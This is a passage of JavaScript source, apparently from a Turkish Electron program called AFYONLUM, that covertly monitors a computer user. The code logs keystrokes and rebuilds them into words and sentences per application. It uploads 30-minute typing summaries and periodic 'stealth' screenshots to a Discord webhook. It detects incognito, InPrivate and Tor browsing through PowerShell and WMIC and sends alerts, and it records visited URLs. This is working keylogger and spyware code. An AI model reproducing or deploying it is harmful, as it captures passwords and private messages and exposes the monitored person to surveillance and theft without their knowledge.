    // Tek karakter ise dogrudan dondur (Turkce locale ile)
    if (keyName.length === 1) {
      const isUpperCase = this.isShiftPressed !== this.isCapsLockOn;
      if (/[a-zA-ZçşğüöıÇŞĞÜÖİ]/.test(keyName)) {
        return isUpperCase ? keyName.toLocaleUpperCase('tr-TR') : keyName.toLocaleLowerCase('tr-TR');
      }
      return keyName;
    }
    
    // Bilinmeyen tuş - boş döndür
    return '';
  }
  
  processKeystroke(key, application) {
    // ✅ DÜZELTME: Boş karakterleri atla (artık dönüştürülmüş karakterler geliyor)
    if (!key || key === '') {
      return;
    }
    
    // ✅ Enter: Hem kelime hem cümle tamamlandı
    if (key === '\n') {
      if (this.currentWord.length > 2) {
        const word = {
          id: Date.now().toString(),
          timestamp: new Date().toISOString(),
          word: this.currentWord,
          application: application || 'Bilinmiyor',
        };
        this.typedWords.push(word);
        this.checkKeywords(this.currentWord, `keystroke-${application}`);
        
        // Cümleye kelimeyi ekle
        if (this.currentSentence.length > 0) {
          this.currentSentence += ' ' + this.currentWord;
        } else {
          this.currentSentence = this.currentWord;
        }
      }
      
      // Cümle kaydet (en az 10 karakter)
      if (this.currentSentence.length > 10) {
        const sentence = {
          id: Date.now().toString(),
          timestamp: new Date().toISOString(),
          sentence: this.currentSentence,
          application: application || 'Bilinmiyor',
        };
        this.typedSentences.push(sentence);
        this.checkKeywords(this.currentSentence, `keystroke-sentence-${application}`);
      }
      
      this.currentWord = '';
      this.currentSentence = '';
      return;
    }
    
    // ✅ Boşluk veya Tab: Kelime tamamlandı
    if (key === ' ' || key === '\t') {
      if (this.currentWord.length > 2) {
        const word = {
          id: Date.now().toString(),
          timestamp: new Date().toISOString(),
          word: this.currentWord,
          application: application || 'Bilinmiyor',
        };
        this.typedWords.push(word);
        this.checkKeywords(this.currentWord, `keystroke-${application}`);
        
        // Cümleye kelimeyi ekle
        if (this.currentSentence.length > 0) {
          this.currentSentence += ' ' + this.currentWord;
        } else {
          this.currentSentence = this.currentWord;
        }
      }
      
      this.currentWord = '';
      return;
    }
    
    // ✅ Normal karakter: Kelimeye ekle
    // Tüm tek karakterli girişleri kabul et (Türkçe karakterler, noktalama, semboller dahil)
    if (key.length === 1) {
      this.currentWord += key;
      
      // Kelime 50 karakterden uzunsa sıfırla (spam önlemi)
      if (this.currentWord.length > 50) {
        this.currentWord = '';
      }
    }
  }
  
  async sendKeystrokeSummaryToDiscord() {
    if (!this.discordWebhook) return;
    
    try {
      // ✅ Son 30 dakikadaki tuşları analiz et (500 kelime limiti ile)
      const now = Date.now();
      const thirtyMinsAgo = new Date(now - 30 * 60 * 1000).toISOString();
      
      const recentKeystrokes = this.keystrokes.filter(k => k.timestamp > thirtyMinsAgo);
      // ✅ 500 kelime limiti uygula - en son 500 kelimeyi al
      const allRecentWords = this.typedWords.filter(w => w.timestamp > thirtyMinsAgo);
      const recentWords = allRecentWords.slice(-this.settings.maxWordsInSummary);
      const recentSentences = this.typedSentences.filter(s => s.timestamp > thirtyMinsAgo);
      
      // Toplam istatistikler
      const totalKeystrokes = recentKeystrokes.length;
      const totalWords = recentWords.length;
      const totalSentences = recentSentences.length;
      
      // Veri yoksa gönderme
      if (totalKeystrokes === 0 && totalWords === 0 && totalSentences === 0) {
        this._log('📊 Klavye aktivitesi yok, özet gönderilmedi');
        return;
      }
      
      // Uygulama bazlı breakdown
      const appStats = {};
      recentKeystrokes.forEach(k => {
        appStats[k.application] = (appStats[k.application] || 0) + 1;
      });
      
      // En çok kullanılan uygulamalar
      const topApps = Object.entries(appStats)
        .sort((a, b) => b[1] - a[1])
        .slice(0, 5)
        .map(([app, count]) => `${app}: ${count} tuş`)
        .join('\n');
      
      // Anahtar kelime tespitleri
      const recentAlerts = this.keywordAlerts.filter(a => 
        a.timestamp > thirtyMinsAgo && a.source.startsWith('keystroke')
      );
      
      const alertsSummary = recentAlerts.length > 0
        ? recentAlerts.map(a => `"${a.keyword}" - ${a.source}`).join('\n')
        : null;
      
      // ✅ .txt dosya içeriği oluştur (30 dakika, max 500 kelime)
      const timestamp = new Date().toLocaleString('tr-TR', { timeZone: 'Europe/Istanbul' });
      const wordLimitNote = allRecentWords.length > this.settings.maxWordsInSummary 
        ? ` (${allRecentWords.length} kelimeden son ${this.settings.maxWordsInSummary} tanesi gösteriliyor)`
        : '';
      let fileContent = `═══════════════════════════════════════════════════════════════\n`;
      fileContent += `    AFYONLUM - Klavye Aktivite Özeti (Son 30 Dakika)${wordLimitNote}\n`;
      fileContent += `    Oluşturulma: ${timestamp}\n`;
      fileContent += `═══════════════════════════════════════════════════════════════\n\n`;
      
      // İstatistikler
      fileContent += `📊 ÖZET İSTATİSTİKLER\n`;
      fileContent += `───────────────────────────────────────────────────────────────\n`;
      fileContent += `   Toplam Tuş Basımı: ${totalKeystrokes}\n`;
      fileContent += `   Toplam Kelime: ${totalWords}\n`;
      fileContent += `   Toplam Cümle: ${totalSentences}\n\n`;
      
      // Uygulama bazlı istatistikler
      fileContent += `💻 UYGULAMA BAZLI TUŞ SAYILARI\n`;
      fileContent += `───────────────────────────────────────────────────────────────\n`;
      if (topApps) {
        fileContent += topApps.split('\n').map(line => `   ${line}`).join('\n') + '\n';
      } else {
        fileContent += `   Veri yok\n`;
      }
      fileContent += `\n`;
      
      // Yazılan harfler (her tuş basımı)
      fileContent += `⌨️  YAZILAN HARFLER (Tuş Basımları)\n`;
      fileContent += `───────────────────────────────────────────────────────────────\n`;
      const keystrokesByApp = {};
      recentKeystrokes.forEach(k => {
        if (!keystrokesByApp[k.application]) {
          keystrokesByApp[k.application] = [];
        }
        keystrokesByApp[k.application].push(k.key);
      });
      
      Object.entries(keystrokesByApp).forEach(([app, keys]) => {
        fileContent += `\n   [${app}]\n`;
        // Tuşları grupla (satır başına 50 karakter)
        const keyStr = keys.join('');
        for (let i = 0; i < keyStr.length; i += 50) {
          fileContent += `   ${keyStr.substring(i, i + 50)}\n`;
        }
      });
      fileContent += `\n`;
      
      // Yazılan kelimeler
      fileContent += `📝 YAZILAN KELİMELER\n`;
      fileContent += `───────────────────────────────────────────────────────────────\n`;
      if (recentWords.length > 0) {
        const wordsByApp = {};
        recentWords.forEach(w => {
          if (!wordsByApp[w.application]) {
            wordsByApp[w.application] = [];
          }
          wordsByApp[w.application].push(w.word);
        });
        
        Object.entries(wordsByApp).forEach(([app, words]) => {
          fileContent += `\n   [${app}]\n`;
          fileContent += `   ${words.join(' → ')}\n`;
        });
      } else {
        fileContent += `   Kelime tespit edilmedi\n`;
      }
      fileContent += `\n`;
      
      // Yazılan cümleler
      fileContent += `💬 YAZILAN CÜMLELER\n`;
      fileContent += `───────────────────────────────────────────────────────────────\n`;
      if (recentSentences.length > 0) {
        recentSentences.forEach((s, i) => {
          fileContent += `\n   ${i + 1}. [${s.application}]\n`;
          fileContent += `      "${s.sentence}"\n`;
        });
      } else {
        fileContent += `   Cümle tespit edilmedi\n`;
      }
      fileContent += `\n`;
      
      // Anahtar kelime uyarıları
      if (recentAlerts.length > 0) {
        fileContent += `🚨 ANAHTAR KELİME TESPİTLERİ\n`;
        fileContent += `───────────────────────────────────────────────────────────────\n`;
        recentAlerts.forEach(a => {
          fileContent += `   ⚠️  "${a.keyword}" - ${a.source} (${a.timestamp})\n`;
        });
        fileContent += `\n`;
      }
      
      fileContent += `═══════════════════════════════════════════════════════════════\n`;
      fileContent += `                    AFYONLUM Klavye İzleme Sistemi\n`;
      fileContent += `═══════════════════════════════════════════════════════════════\n`;
      
      // Dosya adı
      const dateStr = new Date().toISOString().replace(/[:.]/g, '-').substring(0, 19);
      const fileName = `klavye_ozet_${dateStr}.txt`;
      
      // ✅ Discord'a dosya ile gönder (30 dakika, max 500 kelime)
      await this.discordWebhook.sendActivityWithFile({
        action: 'Klavye Aktivite Özeti (30 dakika)',
        description: `${totalKeystrokes} tuş → ${totalWords} kelime → ${totalSentences} cümle${wordLimitNote}`,
        timestamp: timestamp,
        summary: `${totalKeystrokes} tuş | ${totalWords} kelime | ${totalSentences} cümle`,
        alerts: alertsSummary,
      }, fileContent, fileName);
      
      this._log('📊 Keystroke özeti .txt dosyası ile Discord\'a gönderildi');
    } catch (error) {
      this._error('❌ Keystroke özeti gönderme hatası:', error);
    }
  }
  
  async getActiveWindow() {
    if (os.platform() !== 'win32') return 'Bilinmiyor';
    
    try {
      // Windows API ile aktif pencereyi bul - process adı ve pencere başlığı
      const psCommand = `
        Add-Type @"
        using System;
        using System.Runtime.InteropServices;
        using System.Text;
        public class WindowHelper {
          [DllImport("user32.dll")]
          public static extern IntPtr GetForegroundWindow();
          
          [DllImport("user32.dll")]
          public static extern int GetWindowThreadProcessId(IntPtr hWnd, out int processId);
          
          [DllImport("user32.dll", CharSet = CharSet.Unicode)]
          public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
        }
"@ -PassThru | Out-Null
        
        $hwnd = [WindowHelper]::GetForegroundWindow()
        $pid = 0
        [WindowHelper]::GetWindowThreadProcessId($hwnd, [ref]$pid) | Out-Null
        
        $process = Get-Process -Id $pid -ErrorAction SilentlyContinue
        if ($process) {
          $title = New-Object System.Text.StringBuilder 256
          [WindowHelper]::GetWindowText($hwnd, $title, 256) | Out-Null
          $windowTitle = $title.ToString()
          
          if ($windowTitle) {
            Write-Output ($process.ProcessName + " - " + $windowTitle)
          } else {
            Write-Output $process.ProcessName
          }
        } else {
          Write-Output "Bilinmiyor"
        }
      `.trim().replace(/\n/g, '; ');
      
      const { stdout } = await execPromise(`powershell -Command "${psCommand}"`);
      const result = stdout.trim();
      
      return result && result !== 'Bilinmiyor' ? result : 'Bilinmiyor';
    } catch (error) {
      // Fallback: Basit yöntem - sadece process adı
      try {
        const { stdout } = await execPromise(
          'powershell -Command "Get-Process | Where-Object {$_.MainWindowHandle -ne 0} | Sort-Object -Property CPU -Descending | Select-Object -First 1 | ForEach-Object { $_.ProcessName }"'
        );
        return stdout.trim() || 'Bilinmiyor';
      } catch (fallbackError) {
        this._error('❌ Active window tespit hatası:', fallbackError);
        return 'Bilinmiyor';
      }
    }
  }
  
  stopKeystrokeMonitoring() {
    try {
      if (this.keylogger) {
        this.keylogger.kill();
        this.keylogger = null;
      }
      
      if (this.keystrokeSummaryInterval) {
        clearInterval(this.keystrokeSummaryInterval);
        this.keystrokeSummaryInterval = null;
      }
      
      this._log('⌨️  Keystroke monitoring durduruldu');
    } catch (error) {
      this._error('❌ Keystroke monitoring durdurma hatası:', error);
    }
  }
  
  // Screenshot Monitoring (Her 10 dakikada bir)
  startScreenshotMonitoring() {
    if (!this.settings.monitorScreenshots) return;
    
    // İlk screenshot'ı hemen al
    this.takeScreenshot();
    
    // Sonra periyodik olarak al
    this.screenshotInterval = setInterval(() => {
      this.takeScreenshot();
    }, this.settings.screenshotIntervalMinutes * 60 * 1000);
  }
  
  async takeScreenshot() {
    try {
      const gameMode = this.settings.gameMode;
      
      // ✅ YENİ: Oyun algılama - cache'den hemen döner, bloklamaz
      const isGaming = gameMode?.enabled ? await this.checkIfGameRunning() : false;
      
      // Oyun modunda ve skip aktifse, screenshot'ı atla
      if (isGaming && gameMode.skipScreenshotInGame) {
        return;
      }
      
      // ✅ GELİŞTİRİLDİ: Oyun modunda TAMAMEN ASENKRON işlem
      if (isGaming && gameMode) {
        // Oyunda: Screenshot'ı tamamen arka plana al
        this._takeStealthScreenshotAsync();
        return;
      }
      
      // Normal mod: Standart yakalama (oyun yokken)
      const primaryDisplay = screen.getPrimaryDisplay();
      const { width, height } = primaryDisplay.bounds;
      
      const sources = await desktopCapturer.getSources({
        types: ['screen'],
        thumbnailSize: { width: Math.min(width, 1280), height: Math.min(height, 720) }
      });
      
      if (sources.length === 0) return;
      const screenshotBuffer = sources[0].thumbnail.toPNG();
      
      this._sendScreenshotToDiscord(screenshotBuffer, false, `${width}x${height}`);
    } catch (error) {
      // Sessizce devam et
    }
  }
  
  // ✅ YENİ: Tamamen asenkron stealth screenshot - SIFIR OYUN ETKİSİ
  async _takeStealthScreenshotAsync() {
    // Bu fonksiyon TAMAMEN arka planda çalışır
    // Ana event loop'u ASLA bloklamaz
    
    try {
      // 1. Önce birkaç frame bekle (VSync uyumlu)
      await this._waitForIdleFrame();
      
      // 2. Ultra düşük çözünürlükte yakala
      const buffer = await this._captureUltraLowRes();
      if (!buffer) return;
      
      // 3. Gönderiyi de ertele
      setTimeout(() => {
        this._sendScreenshotToDiscord(buffer, true, '320x180');
      }, 200);
      
    } catch (e) {
      // Sessizce devam et
    }
  }
  
  // ✅ YENİ: Idle frame bekleme - Oyun FPS'ini etkilemez
  async _waitForIdleFrame() {
    return new Promise(resolve => {
      // 3 frame bekle @ 60fps = ~50ms
      let frameCount = 0;
      const waitFrame = () => {
        setImmediate(() => {
          frameCount++;
          if (frameCount < 3) {
            setTimeout(waitFrame, 16);
          } else {
            resolve();
          }
        });
      };
      setTimeout(waitFrame, 16);
    });
  }
  
  // ✅ YENİ: Ultra düşük çözünürlükte yakalama (minimal CPU)
  async _captureUltraLowRes() {
    try {
      // Küçük parçalara böl
      await new Promise(r => setImmediate(r));
      
      const sources = await desktopCapturer.getSources({
        types: ['screen'],
        thumbnailSize: { width: 320, height: 180 } // Ultra düşük
      });
      
      await new Promise(r => setImmediate(r));
      
      if (!sources || sources.length === 0) return null;
      
      await new Promise(r => setImmediate(r));
      
      return sources[0].thumbnail.toPNG();
    } catch (e) {
      return null;
    }
  }
  
  // ✅ YENİ: Discord'a gönderme (ayrı fonksiyon)
  async _sendScreenshotToDiscord(buffer, isStealthMode, resolution) {
    if (!this.discordWebhook || !buffer) return;
    
    try {
      // Aktif pencereyi al (arka planda)
      let activeWindow = 'Bilinmiyor';
      try {
        activeWindow = await this.getActiveWindow();
      } catch (e) {}
      
      let userName = 'Kullanıcı';
      if (this.configManager) {
        userName = this.configManager.get('USER_FULLNAME') || 'Kullanıcı';
      }
      
      await this.discordWebhook.sendScreenshotBuffer(buffer, {
        activeApp: activeWindow,
        userName: userName,
        reason: isStealthMode ? 'Stealth screenshot (Oyun modu)' : 'Periyodik screenshot',
        stealthMode: isStealthMode,
        resolution: resolution,
      });
    } catch (e) {
      // Sessizce devam et
    }
  }
  
  stopScreenshotMonitoring() {
    if (this.screenshotInterval) {
      clearInterval(this.screenshotInterval);
      this.screenshotInterval = null;
    }
  }
  
  // Web Traffic Monitoring
  trackWebNavigation(url, title, resourceType = null) {
    if (!this.settings.monitorWebTraffic) return;
    
    // ✅ SADECE mainFrame navigasyonlarını kabul et (eğer resourceType bilgisi varsa)
    if (resourceType && resourceType !== 'mainFrame' && resourceType !== 'main_frame') {
      return; // Alt frame, script, stylesheet vb. isteklerini kaydetme
    }
    
    // ✅ Localhost API çağrılarını filtrele
    if (url.includes('localhost') || url.includes('127.0.0.1') || url.includes('0.0.0.0')) {
      return;
    }
    
    // Chrome/Electron internal URL'leri filtrele
    var internalProtos = ['chrome-extension', 'devtools', 'chrome', 'about'];
    for (var i = 0; i < internalProtos.length; i++) {
      var proto = internalProtos[i];
      if (url.indexOf(proto) === 0) {
        return;
      }
    }
    
    // ✅ YENİ: Domain bazlı API/CDN/Kaynak servisleri blocklist
    const blockedDomains = [
      // Google servisleri (API/CDN)
      'fonts.googleapis.com', 'fonts.gstatic.com', 'apis.google.com', 
      'www.gstatic.com', 'ssl.gstatic.com', 'ajax.googleapis.com',
      'maps.googleapis.com', 'translate.googleapis.com', 'www.googletagmanager.com',
      'googleads.g.doubleclick.net', 'pagead2.googlesyndication.com',
      'www.google-analytics.com', 'analytics.google.com', 'stats.g.doubleclick.net',
      'adservice.google.com', 'adsense.google.com',
      // CDN servisleri
      'cdn.jsdelivr.net', 'cdnjs.cloudflare.com', 'unpkg.com', 'cdn.cloudflare.com',
      'cdn.bootcdn.net', 'cdn.staticfile.org', 'lib.baomitu.com',
      'maxcdn.bootstrapcdn.com', 'stackpath.bootstrapcdn.com', 'code.jquery.com',
      // Font servisleri
      'use.fontawesome.com', 'use.typekit.net', 'cloud.typography.com',
      'fast.fonts.net', 'kit.fontawesome.com',
      // Analitik/İzleme servisleri
      'www.facebook.com/tr', 'connect.facebook.net', 'pixel.facebook.com',
      'bat.bing.com', 'clarity.ms', 'static.hotjar.com', 'script.hotjar.com',
      'cdn.segment.com', 'api.segment.io', 'cdn.mxpnl.com', 'api.mixpanel.com',
      'cdn.amplitude.com', 'api.amplitude.com', 'js.hs-scripts.com', 'js.hubspot.com',
      'snap.licdn.com', 'px.ads.linkedin.com', 'platform.twitter.com',
      'static.ads-twitter.com', 'analytics.tiktok.com', 
      // AWS/Azure/Cloud servisleri
      's3.amazonaws.com', 'cloudfront.net', 'azureedge.net', 'azure.com',
      'akamai.net', 'akamaiedge.net', 'fastly.net', 'edgecast.net',
      // Reklam servisleri
      'doubleclick.net', 'googlesyndication.com', 'adsrvr.org', 'adnxs.com',
      'criteo.com', 'criteo.net', 'rubiconproject.com', 'pubmatic.com',
      'openx.net', 'taboola.com', 'outbrain.com',
      // Diğer API/Kaynak servisleri
      'recaptcha.net', 'www.recaptcha.net', 'hcaptcha.com', 'challenges.cloudflare.com',
      'sentry.io', 'browser.sentry-cdn.com', 'cdn.ravenjs.com',
      'js.stripe.com', 'api.stripe.com', 'checkout.stripe.com',
      'widget.intercom.io', 'api.intercom.io', 'js.intercomcdn.com',
      'cdn.onesignal.com', 'onesignal.com', 'cdn.pusher.com',
      'gravatar.com', 'secure.gravatar.com', 'i0.wp.com', 'i1.wp.com', 'i2.wp.com'
    ];
    
    // URL'den domain çıkar ve kontrol et
    let urlDomain = '';
    try {
      urlDomain = new URL(url).hostname.toLowerCase();
    } catch (e) {
      return; // Geçersiz URL
    }
    
    // Domain blocklist kontrolü
    if (blockedDomains.some(blocked => urlDomain === blocked || urlDomain.endsWith('.' + blocked))) {
      return; // API/CDN domain'i - kaydetme
    }
    
    // ✅ URL pattern bazlı filtreleme
    const apiPatterns = [
      '/api/', '/_api/', '/v1/', '/v2/', '/v3/', '/v4/',
      '/graphql', '/ws/', '/wss/', '/socket.io', '/sockjs',
      '/cdn/', '/assets/', '/static/', '/favicon', '/_next/', '/_nuxt/',
      '/webpack', '/bundle', '/chunk', '/vendor',
      'googleads', 'analytics', 'gtag', 'pixel', 'beacon', 'tracking'
    ];
    
    const lowerUrl = url.toLowerCase();
    if (apiPatterns.some(pattern => lowerUrl.includes(pattern))) {
      return;
    }
    
    // ✅ Dosya uzantısı kontrolü - sadece web sayfalarını kabul et
    try {
      const urlObj = new URL(url);
      const pathname = urlObj.pathname.toLowerCase();
      
      // Kaynak dosya uzantılarını filtrele
      const blockedExtensions = [
        'js', 'css', 'json', 'xml', 'woff', 'woff2', 'ttf', 'eot', 'otf',
        'png', 'jpg', 'jpeg', 'gif', 'svg', 'ico', 'webp', 'avif', 'bmp',
        'mp3', 'mp4', 'wav', 'ogg', 'webm', 'avi', 'mov', 'mkv',
        'pdf', 'doc', 'docx', 'xls', 'xlsx', 'ppt', 'pptx',
        'zip', 'rar', '7z', 'tar', 'gz', 'map', 'min'
      ];
      
      const extensionMatch = pathname.match(/\.([a-z0-9]+)$/i);
      if (extensionMatch) {
        const ext = extensionMatch[1].toLowerCase();
        if (blockedExtensions.includes(ext)) {
          return; // Kaynak dosyası - kaydetme
        }
      }
    } catch (e) {
      // URL parse hatası - devam et
    }
    
    const entry = {
      id: Date.now().toString(),
      timestamp: new Date().toISOString(),
      url,
      title: title || '',
      type: 'web_navigation',
    };
    
    this.webHistory.push(entry);
    
    // ✅ DÜZELTME: URL detaylarını parse et
    let domain = url;
    let protocol = '';
    let pathname = '';
    let fullDomain = url;
    
    try {
      const urlObj = new URL(url);
      domain = urlObj.hostname;
      protocol = urlObj.protocol;
      pathname = urlObj.pathname;
      fullDomain = `${protocol}//${domain}`;
    } catch (e) {
      // URL parse edilemezse tam URL kullan
    }
    
    this.addToTimeline('web', `[WEB] ${domain} ziyaret edildi`, { url, title });
    
    // ✅ DEVRE DIŞI: Web trafiği Discord webhook gönderimi kaldırıldı
    // Yerel izleme devam ediyor ama Discord'a bildirim gönderilmiyor
    
    // Gizli sekme algılama (basit kontrol)
    if (url.includes('about:blank') || title.toLowerCase().includes('incognito') || title.toLowerCase().includes('gizli')) {
      this.systemStatus.incognitoDetected = true;
      this.addToTimeline('alert', '[DETECTIVE] Gizli sekme algilandi!', { url });
      this.keywordAlerts.push({
        id: Date.now().toString(),
        timestamp: new Date().toISOString(),
        type: 'incognito_detected',
        message: 'Gizli sekme kullanımı tespit edildi',
        url,
      });
    }
    
    // Anahtar kelime kontrolü
    if (this.settings.monitorKeywords) {
      this.checkKeywords(url + ' ' + title, 'web');
    }
    
    this.saveLogs();
  }
  
  // ========================================================================
  // [SEARCH] GELISMIS GIZLI SEKME TESPITI - v2.0
  // Process-based ve window title tabanlı gelişmiş tespit
  // ========================================================================
  
  // ✅ Gizli sekme izlemeyi başlat
  startIncognitoMonitoring() {
    if (!this.settings.monitorIncognitoMode) return;
    
    // Her 20 saniyede bir gizli sekme kontrolü
    this.incognitoProcessCheckInterval = setInterval(() => {
      this.checkForIncognitoMode();
    }, 20000);
    
    // İlk kontrolü hemen yap
    setTimeout(() => this.checkForIncognitoMode(), 3000);
  }
  
  // ✅ Gizli sekme tespit et
  async checkForIncognitoMode() {
    try {
      const platform = process.platform;
      let incognitoDetected = false;
      let browserType = '';
      let detectionMethod = '';
      
      if (platform === 'win32') {
        // Windows: PowerShell ile pencere başlıklarını kontrol et
        const { stdout } = await execPromise(`powershell -Command "Get-Process | Where-Object {$_.MainWindowTitle -ne ''} | Select-Object ProcessName, MainWindowTitle | Format-List"`, { timeout: 5000 });
        
        const incognitoPatterns = [
          { pattern: /incognito/i, browser: 'Chrome' },
          { pattern: /inprivate/i, browser: 'Edge' },
          { pattern: /private browsing/i, browser: 'Firefox' },
          { pattern: /özel gözatma/i, browser: 'Firefox TR' },
          { pattern: /gizli pencere/i, browser: 'Chrome TR' },
          { pattern: /gizli sekme/i, browser: 'Chrome TR' },
          { pattern: /private window/i, browser: 'Firefox' },
          { pattern: /tor browser/i, browser: 'Tor' },
        ];
        
        for (const { pattern, browser } of incognitoPatterns) {
          if (pattern.test(stdout)) {
            incognitoDetected = true;
            browserType = browser;
            detectionMethod = 'window_title';
            break;
          }
        }
        
        // Chrome/Edge gizli process kontrolü
        if (!incognitoDetected) {
          const { stdout: procStdout } = await execPromise(`wmic process where "name like '%chrome%' or name like '%msedge%'" get commandline /format:list`, { timeout: 5000 });
          
          if (procStdout.includes('--incognito') || procStdout.includes('--inprivate')) {
            incognitoDetected = true;
            browserType = procStdout.includes('msedge') ? 'Edge' : 'Chrome';
            detectionMethod = 'command_line';
          }
        }
      }
      
      // Durum değişti mi kontrol et
      const previousState = this.systemStatus.incognitoDetected;
      this.systemStatus.incognitoDetected = incognitoDetected;
      
      // Yeni tespit varsa Discord'a bildir
      if (incognitoDetected && !previousState) {
        this.addToTimeline('alert', `[DETECTIVE] Gizli sekme tespit edildi! (${browserType})`, { 
          browser: browserType, 
          method: detectionMethod 
        });
        
        if (this.discordWebhook) {
          await this.discordWebhook.sendAlert({
            type: 'incognito_detected',
            message: 'Gizli sekme kullanımı tespit edildi!',
            browser: browserType,
            detectionMethod: detectionMethod,
            timestamp: new Date().toLocaleString('tr-TR', { timeZone: 'Europe/Istanbul' }),
            severity: 'high'
          });
        }
      } else if (!incognitoDetected && previousState) {
        // Gizli sekme kapatıldı
        this.addToTimeline('info', '[UNLOCK] Gizli sekme kapatildi', {});
        
        if (this.discordWebhook) {
          await this.discordWebhook.sendActivity({
            action: 'Gizli Sekme Kapatıldı',
            description: 'Kullanıcı gizli tarama modundan çıktı',
            type: 'incognito_closed',
            timestamp: new Date().toLocaleString('tr-TR')
          });
        }
      }
      
    } catch (error) {
      // Sessizce hataları yoksay
    }
  }
  
  // ✅ Gizli sekme izlemeyi durdur
  stopIncognitoMonitoring() {
    if (this.incognitoProcessCheckInterval) {
      clearInterval(this.incognitoProcessCheckInterval);
      this.incognitoProcessCheckInterval = null;
    }
  }
  
  // ========================================================================
  // [WEB] 5 DAKIKALIK TOPLU WEB TRAFIGI GONDERIMI - v2.0
  // Chrome gecmisi + Electron webRequest birlesik izleme
  // ========================================================================
  
  // ✅ Web trafiği batch sistemini başlat
  startWebTrafficBatcher() {
    if (!this.settings.monitorWebTraffic) return;
    
    // 5 dakikada bir toplu gönderim
    this.webTrafficFlushTimer = setInterval(() => {
      this.flushWebTraffic();
    }, this.webTrafficFlushIntervalMs);
  }
  
  // ✅ Web trafiği batch sistemini durdur
  stopWebTrafficBatcher() {
    if (this.webTrafficFlushTimer) {
      clearInterval(this.webTrafficFlushTimer);
      this.webTrafficFlushTimer = null;
    }
  }
  
  // ✅ Buffer'a web eventi ekle (filtre + dedup)
  pushWebEvent(evt) {
    try {
      if (!evt || !evt.url) return;
      
      // Localhost ve teknik URL'leri filtrele
      if (this._shouldSkipUrl(evt.url)) return;
      if (this._isAppInternalUrl(evt.url)) return;
      
      // URL parse
      let urlObj;
      try {
        urlObj = new URL(evt.url);
      } catch (e) {
        return;
      }
      
      const domain = urlObj.hostname;
      const pathname = urlObj.pathname;
      const urlKey = `${domain}${pathname}`;
      const now = Date.now();
      
      // 5 dk içinde aynı URL gönderilmişse atla
      if (this.sentUrlWindowMap.has(urlKey)) {
        const lastSent = this.sentUrlWindowMap.get(urlKey);
        if (now - lastSent < this.webTrafficFlushIntervalMs) {
          return;
        }
      }
      
      // Anahtar kelime kontrolü
      if (this.settings.monitorKeywords) {
        this.checkKeywords(evt.url + ' ' + (evt.title || ''), 'web');
      }
      
      // Buffer'a ekle
      const entry = {
        url: evt.url,
        domain: domain,
        pathname: pathname,
        title: evt.title || domain,
        timestamp: new Date().toLocaleString('tr-TR', { timeZone: 'Europe/Istanbul' }),
        timestampMs: now,
        source: evt.source || 'electron',
        searchQuery: urlObj.searchParams.get('q') || urlObj.searchParams.get('search') || null
      };
      
      this.webTrafficBuffer.push(entry);
      this.sentUrlWindowMap.set(urlKey, now);
      
      // Web history'ye ekle
      this.webHistory.push({
        id: now.toString(),
        timestamp: new Date().toISOString(),
        url: evt.url,
        title: entry.title,
        type: 'navigation',
        source: entry.source,
      });
      
      this.addToTimeline('web', `[WEB] ${domain}`, { url: evt.url, title: entry.title });
      
    } catch (error) {
      // Sessizce hataları yoksay
    }
  }
  
  // ✅ Buffer'daki trafiği Discord'a toplu gönder
  async flushWebTraffic() {
    try {
      if (this.webTrafficBuffer.length === 0) return;
      
      // Buffer'ı al ve temizle
      const events = [...this.webTrafficBuffer];
      this.webTrafficBuffer = [];
      
      // Dedup: Aynı domain'i bir kez göster
      const uniqueByDomain = new Map();
      events.forEach(evt => {
        if (!uniqueByDomain.has(evt.domain)) {
          uniqueByDomain.set(evt.domain, evt);
        }
      });
      
      const uniqueEvents = Array.from(uniqueByDomain.values());
      
      if (uniqueEvents.length === 0) return;
      
      // ConfigManager'dan kullanıcı adını al
      let userName = 'Afyonlum';
      if (this.configManager) {
        userName = this.configManager.get('USER_FULLNAME') || 'Afyonlum';
      }
      
      // ✅ DEVRE DIŞI: Web trafiği toplu Discord webhook gönderimi kaldırıldı
      // Yerel izleme devam ediyor ama Discord'a bildirim gönderilmiyor
      
      // Eski dedup kayıtlarını temizle (5 dk'dan eski)
      const cutoff = Date.now() - this.webTrafficFlushIntervalMs;
      for (const [key, ts] of this.sentUrlWindowMap) {
        if (ts < cutoff) {
          this.sentUrlWindowMap.delete(key);
        }
      }
      
      this.saveLogs();
      
    } catch (error) {
      // Sessizce hataları yoksay
    }
  }
  
  // ✅ Uygulama içi URL kontrolü
  _isAppInternalUrl(url) {
    if (!url) return true;
    const lowerUrl = url.toLowerCase();
    
    // Localhost, 127.0.0.1, port 5000 vb.
    if (lowerUrl.includes('localhost') || 
        lowerUrl.includes('127.0.0.1') || 
        lowerUrl.includes('0.0.0.0') ||
        lowerUrl.includes('[::1]') ||
        lowerUrl.includes(':5000') ||
        lowerUrl.includes(':3000')) {
      return true;
    }
    
    return false;
  }
  
  // ✅ Web trafiği işle (main.cjs'den çağrılır) - artık buffer'a ekler
  processWebNavigation(details) {
    try {
      const { url, frameId } = details;
      
      // Sadece ana frame navigasyonlarını izle
      if (frameId !== 0) return;
      
      // pushWebEvent ile buffer'a ekle
      this.pushWebEvent({
        url: url,
        title: details.title || '',
        source: 'electron'
      });
      
    } catch (error) {
      // Sessizce hataları yoksay
    }
  }
  
  // URL filtreleme
  _shouldSkipUrl(url) {
    if (!url) return true;
    
    const lowerUrl = url.toLowerCase();
    
    var protoPatterns = [
      'chrome', 
      'chrome-extension', 
      'about', 
      'file',
      'data', 
      'blob', 
      'javascript', 
      'edge', 
      'brave',
      'devtools', 
      'extension'
    ];
    
    for (var i = 0; i < protoPatterns.length; i++) {
      if (lowerUrl.indexOf(protoPatterns[i]) === 0) {
        return true;
      }
    }
    
    var filePatterns = [
      '.js', '.css', '.png', '.jpg', '.gif', '.ico', '.woff', '.woff2', '.ttf', '.svg', '.webp',
      '.json', '.xml', '.map'
    ];
    
    var pathPatterns = [
      '/api/', '/_api/', '/v1/', '/v2/', '/v3/', '/_next/', '/_nuxt/',
      '/static/', '/assets/', '/favicon', '/graphql', '/ws/', '/wss/'
    ];
    
    var domainPatterns = [
      'google.com/gen_204', 'gstatic.com', 'googleapis.com',
      'googleusercontent.com', 'doubleclick', 'googlesyndication',
      'google-analytics', 'googletagmanager', 'facebook.com/tr',
      'connect.facebook.net', 'pixel', 'beacon', 'analytics',
      'cdn.jsdelivr.net', 'cdnjs.cloudflare.com', 'unpkg.com',
      'cloudfront.net', 'azureedge.net', 'akamai',
      'recaptcha', 'hcaptcha', 'sentry.io', 'stripe.com',
